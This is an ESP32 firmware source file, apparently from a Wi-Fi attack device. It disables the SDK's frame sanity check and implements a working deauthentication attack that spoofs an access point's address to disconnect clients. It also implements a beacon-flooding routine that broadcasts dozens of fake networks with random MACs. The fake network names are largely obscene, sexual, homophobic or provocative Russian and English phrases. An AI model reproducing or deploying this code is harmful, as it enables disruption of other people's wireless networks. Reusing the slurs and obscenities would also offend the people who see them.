#include "atk.h"
#include <esp_wifi.h>
#include <WiFi.h>
#include <memory.h>
#include "types.h"
#include "global.h"

uint16_t beaconCounter = 0;
uint16_t deauthCounter = 0;
uint32_t lastDeauth = 0;
uint32_t lastBeacon = 0;
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);

uint8_t deauthTemplate[26] = {
  /*  0 - 1  */ 0xC0, 0xA0,                          // type, subtype c0: deauth (a0: disassociate)
  /*  2 - 3  */ 0x00, 0x00,                          // duration (SDK takes care of that)
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // reciever (target)
  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // source (ap)
  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,  // BSSID (ap)
  /* 22 - 23 */ 0x00, 0x00,                          // fragment & squence number
  /* 24 - 25 */ 0x01, 0x00                           // reason code (1 = unspecified reason)
};

uint32_t deauthdeadtime = 0;
void sendDeauthPacket(AccessPoint* data, uint8_t mtarget[6]) {
  if (millis() - lastDeauth > 1000) {
    lastDeauth = millis();
    deauthPacketsPerSecond = deauthCounter / 1; 
    deauthCounter = 0;
  }
  uint8_t deauthPacket[26];
  memcpy(deauthPacket, deauthTemplate, 26);
  memcpy(deauthPacket + 10, data->mac, 6);
  memcpy(deauthPacket + 16, data->mac, 6);
  esp_wifi_set_channel(data->data >> 4, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
  deauthCounter++;
}

const char *fun_ssids[]= {
  "POCO X3 NFC",
  "POCO C4 NFC",
  "Venom",
  "Фимоз",
  "Тренболон колю в очко",
  "Вумен момент",
  "Палитра",
  "ZOV ZOV ZOV",
  "Гойда гойда гойда",
  "Шкибиди тойлет",
  "These who knows...",
  "Still water",
  "Шайлушай",
  "Будем мочить в сортире",
  "Я русский!!!",
  "Подключись если ты гей",
  "Подключись если ты лох",
  "Смартфон vivo",
  "Suck some dick",
  "Swallow cum",
  "Гачи мучи",
  "От сердца – к Марсу",
  "Sigma boy",
  "Щавель",
  "Пикми",
  "Чиназес",
  "Их виль нихт",
  "Бобр курва",
  "У мужлан нет прав",
  "На мне бархатные тяги","я лечу как сын мияги",
  "ЯЛКВМОМ",
  "Богдан любит какиш",
  "Я ебу бабульку",
  "42 БРАТУХА",
  "План скам",
  "Ес минус 3 юхуууу",
  "Это шд братик",
  "Mona x slime XXX смотреть",
  "Ой так нравится","долбиться в задницу",
  "Снюсоеды нападают!!!",
  "РосКомЗдрав не запретит","Симпл димпл попит сквиш",
  "8642 ручка трахнула бобра",
  "Собака писала", "собака какала",
  "Гучи флип флап",
  "Эй не корона бро",
  "Я съел деда",
  "Я хочу выебать альтушку",
  "Аллах акбар",
  "1000-7 я Канеки Кен",
  "За ваше здоровье","и за мое очко",
  "Я делаю вдох так пахнет диор",
  "Дыши моментом или как там",
  "Обэмэ",
  "Возми трубку чечня на связи",
  "Ты можешь бегать ПФ ПФ","Ты можешь прыгать ПФ ПФ","Ты можешь летать ПФ ПФ","Но тебе не убежать","Потому что я Пудж",
  "Я настоящий гуль","все остальные фейки",
  ""
};

// Как жаль что не хватает оперативки на шкибиди тойлет
// const char *skibidi_text[] {
//   "Всё начинается с конца",
//   "Каждый день вижу смерть от первого лица",
//   "Каждый день продолжается военный репортаж",
//   "Новый день — новый персонаж",
//   "Всё идёт задом наперёд",
//   "Сегодня боевой товарищ, завтра он умрёт",
//   "Я на поле боя уже десять тысяч лет",
//   "Новый день — новый туалет",
//   "Я тоже чистый лист, в меня вложат CD-диск",
//   "Но камрада воскресить не поможет и спиритист",
//   "Жёлтый свет значит: «Осторожно, берегись!»",
//   "Угроза впереди — это, возможно, скибидист",
//   "В небе роятся вразнобой, как пчёлы",
//   "«Смотрите, невероятная разработка учёных!»",
//   "И полюбуйтесь, до чего дошёл прогресс:",
//   "Skibidi dop-dop-dop, yes yes (Эй!)",
//   "Выжженный пейзаж, как на Барсуме",
//   "Ухмылка на обезображенной парсуне",
//   "Толкан разумен, hive-mind без улья",
//   "Ты расскажи камерамену, что такое настоящее безумие",
//   "Камерамен смотрит камера-мем",
//   "Если он нормалдаки — палец вверх, а если нет, то смерть",
//   "Всегда есть шансы превратиться в туалет",
//   "Компьютермен на фоне как двойной агент",
//   "А в лазарете в меня вложат CD-диск, и я тоже чистый лист",
//   "Но учёный был не чист, да и замешан MrBeast",
//   "Пара красных pills сжираем, как Wagon Wheels",
//   "Знай, у нас выйдет пикник на обломках Alpha Hills",
//   "Любой толчок, и твой «G» смылся, как бачок",
//   "Не ложися на бочок — убьёт серенький толчок",
//   "Говорят, TV-WOMAN не место среди Альянса",
//   "Но женщины не мажут мимо унитаза",
//   "Всё начинается с конца",
//   "Каждый день вижу смерть от первого лица",
//   "Каждый день продолжается военный репортаж",
//   "Новый день — новый персонаж",
//   "Всё идёт задом наперёд",
//   "Сегодня боевой товарищ, завтра он умрёт",
//   "Я на поле боя уже десять тысяч лет",
//   "Я на поле боя, эй, эй!",
//   "Крикнем: «За Альянс!», их орда вокруг, туалет ведь вурдалак",
//   "Тут вурдалак — труп, вдруг DaFuq!?Boom!",
//   "И пока среди зевак бунт",
//   "Против астро, тут либо мутант-друг, либо все тела в грунт",
//   "Стрела в грудь, но не робеет передовая",
//   "Этот сериал посмотрит другой, передавая",
//   "По цепочке воспоминания",
//   "Палец вверх, до свидания!"
// };

uint8_t beaconFrame[109] = {
  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source

  // Fixed parameters
  /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
  /* 32 - 33 */ 0x64, 0x00, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
  /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation

  // Tagged parameters

  // SSID parameters
  /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
  /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20,
  0x20, 0x20, 0x20, 0x20, // SSID

  // Supported Rates
  /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
  /* 72 */ 0x82, // 1(B)
  /* 73 */ 0x84, // 2(B)
  /* 74 */ 0x8b, // 5.5(B)
  /* 75 */ 0x96, // 11(B)
  /* 76 */ 0x24, // 18
  /* 77 */ 0x30, // 24
  /* 78 */ 0x48, // 36
  /* 79 */ 0x6c, // 54

  // Current Channel
  /* 80 - 81 */ 0x03, 0x01, // Channel set, length
  /* 82 */      0x01,       // Current Channel

  // RSN information
  /*  83 -  84 */ 0x30, 0x18,
  /*  85 -  86 */ 0x01, 0x00,
  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
  /*  91 -  92 */ 0x02, 0x00,
  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
  /* 101 - 102 */ 0x01, 0x00,
  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
  /* 107 - 108 */ 0x00, 0x00
};

uint8_t channels[] = {1,3,5,7,9,11,13,2};

struct BeaconFrameLoader {
  uint8_t len;
  uint8_t channel;
  void *next;
  uint8_t *data;
} __attribute__((packed));

BeaconFrameLoader *beaconFrames = nullptr;

void spammerPreparer() {
  BeaconFrameLoader *beaconFrameLoader;
  BeaconFrameLoader *lastFrameLoader = nullptr;
  for (int i = 0; i < sizeof(fun_ssids) / sizeof(fun_ssids[0]); i++) {
    beaconFrameLoader = (BeaconFrameLoader *)malloc(sizeof(BeaconFrameLoader));
    beaconFrameLoader->len = sizeof(beaconFrame) - 32 + strlen(fun_ssids[i]);
    beaconFrameLoader->channel = random(1, 14);
    beaconFrameLoader->data = (uint8_t *)malloc(beaconFrameLoader->len);
    uint8_t mac_addrs[6];
    for (int j = 0; j < 6; j++) {
      mac_addrs[j] = random(256);
    }
    memcpy(beaconFrameLoader->data, beaconFrame, 38);
    for (int j = 0; j < 6; j++) {
      beaconFrameLoader->data[j + 10] = mac_addrs[j];
      beaconFrameLoader->data[j + 16] = mac_addrs[j];
    }
    beaconFrameLoader->data[37] = strlen(fun_ssids[i]);
    memcpy(beaconFrameLoader->data + 38, fun_ssids[i], strlen(fun_ssids[i]));
    memcpy(beaconFrameLoader->data + 38 + strlen(fun_ssids[i]), beaconFrame + 70, sizeof(beaconFrame) - 70);
    beaconFrameLoader->data[82] = beaconFrameLoader->channel;
    beaconFrameLoader->next = nullptr;
    if (beaconFrames == nullptr) {
      beaconFrames = beaconFrameLoader;
    } else {
      lastFrameLoader->next = beaconFrameLoader;
    }
    lastFrameLoader = beaconFrameLoader;
  }
}

// void skibidiPreparer() {
//   BeaconFrameLoader *beaconFrameLoader;
//   BeaconFrameLoader *lastFrameLoader = nullptr;
//   for (int i = 0; i < sizeof(skibidi_text) / sizeof(skibidi_text[0]); i++) {
//     beaconFrameLoader = (BeaconFrameLoader *)malloc(sizeof(BeaconFrameLoader));
//     beaconFrameLoader->len = sizeof(beaconFrame) - 32 + strlen(skibidi_text[i]);
//     beaconFrameLoader->channel = random(1, 14);
//     beaconFrameLoader->data = (uint8_t *)malloc(beaconFrameLoader->len);
//     uint8_t mac_addrs[6];
//     for (int j = 0; j < 6; j++) {
//       mac_addrs[j] = random(256);
//     }
//     memcpy(beaconFrameLoader->data, beaconFrame, 38);
//     for (int j = 0; j < 6; j++) {
//       beaconFrameLoader->data[j + 10] = mac_addrs[j];
//       beaconFrameLoader->data[j + 16] = mac_addrs[j];
//     }
//     beaconFrameLoader->data[37] = strlen(skibidi_text[i]);
//     memcpy(beaconFrameLoader->data + 38, skibidi_text[i], strlen(skibidi_text[i]));
//     memcpy(beaconFrameLoader->data + 38 + strlen(skibidi_text[i]), beaconFrame + 70, sizeof(beaconFrame) - 70);
//     beaconFrameLoader->data[82] = beaconFrameLoader->channel;
//     beaconFrameLoader->next = nullptr;
//     if (beaconFrames == nullptr) {
//       beaconFrames = beaconFrameLoader;
//     } else {
//       lastFrameLoader->next = beaconFrameLoader;
//     }
//     lastFrameLoader = beaconFrameLoader;
//   }
// }

void beaconSpammer(bool *isRunning) {
  BeaconFrameLoader *current = beaconFrames;
  if (*isRunning) {
    if (millis() - lastBeacon > 1000) {
      lastBeacon = millis();
      beaconPacketsPerSecond = beaconCounter;
      beaconCounter = 0;
    }
    for (int i = 0; i < sizeof(fun_ssids) / sizeof(fun_ssids[0]); i++) {
      esp_wifi_set_channel(current->channel, WIFI_SECOND_CHAN_NONE);
      esp_wifi_80211_tx(WIFI_IF_AP, current->data, current->len, 0);
      current->next==nullptr?current=beaconFrames:current = (BeaconFrameLoader *)current->next;
      beaconCounter++;
    }
  }
}

// void skibidiSpammer(bool *isRunning) {
//   BeaconFrameLoader *current = beaconFrames;
//   if (*isRunning) {
//     if (millis() - lastBeacon > 1000) {
//       lastBeacon = millis();
//       beaconPacketsPerSecond = beaconCounter;
//       beaconCounter = 0;
//     }
//     for (int i = 0; i < sizeof(skibidi_text) / sizeof(skibidi_text[0]); i++) {
//       esp_wifi_set_channel(current->channel, WIFI_SECOND_CHAN_NONE);
//       esp_wifi_80211_tx(WIFI_IF_AP, current->data, current->len, 0);
//       current->next==nullptr?current=beaconFrames:current = (BeaconFrameLoader *)current->next;
//       beaconCounter++;
//     }
//   }
// }